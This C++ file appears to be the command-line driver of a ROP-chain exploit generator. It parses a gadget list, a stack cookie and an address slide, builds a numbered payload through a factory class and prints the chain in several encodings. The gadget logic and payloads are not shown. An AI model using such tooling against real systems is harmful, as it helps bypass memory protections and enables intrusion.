//#include "rophelper.h"

#include "main.h"
#include "CreatePayload.h"
#include "IROP.h"

#define USAGE "%s: \nUSAGE: [gadget_list_path] "			\
  "[cookie (hex)] "											\
  "[slide (hex)]  (Optional: \n"							\
  " -p[payload_number] \n"									\
  " -d (debug mode)\n"										\
  " -v (verify payload)\n"									\
  " -g (print more readable payload format)\n"				\
  " -o[output_format]\n"									\
  " (Output format: \n"										\
  "\t 1 for hex, \n"										\
  "\t 2 for b64 (default), \n"								\
  "\t 3 for hex+b64]\n"										\
  "\t 4 for binary, \n"										\
  "\t 8 for base 2"											\
  "))\n"

uint DEBUG_PRINT = FALSE;
uint DEBUG_PAYLOAD = FALSE;
//gl_debug_payload = TRUE;	  
uint gl_arg_size = 24592;

int main(int argc, char **argv)
{
  uint					cookie;
  uint					slide;
  BYTE					verifyPayload = TRUE;
  uint					format = 2;
  uint					payloadNumber = 1;
  std::stringstream		sss;
  std::stringstream		ss;

  if (argc < 4 || 
	  (strncmp(argv[2], "0x", 2) || 
	   !utils::isHexNumber(&argv[2][2]) ||
	   strncmp(argv[3], "0x", 2) ||
	   !utils::isHexNumber(&argv[3][2])))
	{
	  return printf(USAGE, argv[0]);
	}
  
  // extract cookie
  sss << std::hex << argv[2];
  sss >> cookie;
  cookie = utils::changeEndianness32(cookie);
  
  // extract slide
  ss << std::hex << argv[3];
  ss >> slide;

  if (DEBUG)
	printf("params: [%x] [%x] [%s]\n", 
		   cookie, slide, argv[3]);

  while (--argc) {
	if (argv[argc][0] == '-') {
	  for (uint i = 1; argv[argc][i]; i++) {
		// verify payload or not
		if (argv[argc][i] == 'v')
		  verifyPayload = true;
		// print payload debug info
		if (argv[argc][i] == 'd')
		  DEBUG_PAYLOAD = TRUE;
		// print more readable payload format (aligned)
		if (argv[argc][i] == 'g')
		  DEBUG_PRINT = TRUE;
	  }
	  // extract payload number
	  if (argv[argc][1] == 'p')
		payloadNumber = atoi(&argv[argc][2]);
	  // extract output format
	  if (argv[argc][1] == 'o')
		format = atoi(&argv[argc][2]);

	  if (argv[argc][1] == 's') {
		if (utils::isDecNumber(&argv[argc][2])) {
		  gl_arg_size = atoi(&argv[argc][2]);
		}
		else {
		  exit(printf("Number passed with -s is not a "
					  "decimal number (-s%s)\n", 
					  &argv[argc][2]));
		}
	  }
	}
  }

  // create payload
  CreatePayload payloadFactory = 
	CreatePayload(cookie, slide, argv[1]);
  IROP* rop = 
	payloadFactory.generate(payloadNumber);

  if (DEBUG_PAYLOAD)
	printf("\n");

  // output
  if (format & 1)
	rop->printChainHex();
  if (format & 2)
	rop->printChainB64();
  if (format & 4)
	rop->printChainBinary();
  if (format & 8)
	rop->printChainB2();

	// verify payload
  if (verifyPayload) {
	rop->verifyPayload();
  }

  // print stats
  if (DEBUG_PAYLOAD) {
	printf("\n");
	rop->printStats();
  }

  return 0;
}
